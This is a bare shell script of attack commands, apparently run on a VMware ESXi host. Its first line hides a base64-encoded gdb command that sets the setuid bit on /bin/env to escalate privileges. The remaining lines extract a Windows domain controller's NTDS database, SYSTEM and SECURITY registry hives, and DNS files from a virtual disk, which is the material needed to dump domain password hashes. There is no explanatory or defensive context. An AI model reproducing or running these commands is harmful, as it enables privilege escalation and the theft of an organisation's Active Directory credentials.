#!/bin/sh
/bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file

/usr/bin/gdb -pid 113757 --command=/tmp/gdb_file

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" ls .

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" info "<REDACTED>-flat.vmdk"

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" ls "<REDACTED>-flat.vmdk:part2"

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" extract "<REDACTED>-flat.vmdk:part4/Windows/NTDS" ./NTDS

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" extract "<REDACTED>-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" extract "<REDACTED>-flat.vmdk:part4/Windows/System32/config/SECURITY" ./

python vmfs_browser.py -d "/dev/disks/vml.<REDACTED>:1" extract "<REDACTED>-flat.vmdk:part4/Windows/System32/dns" ./
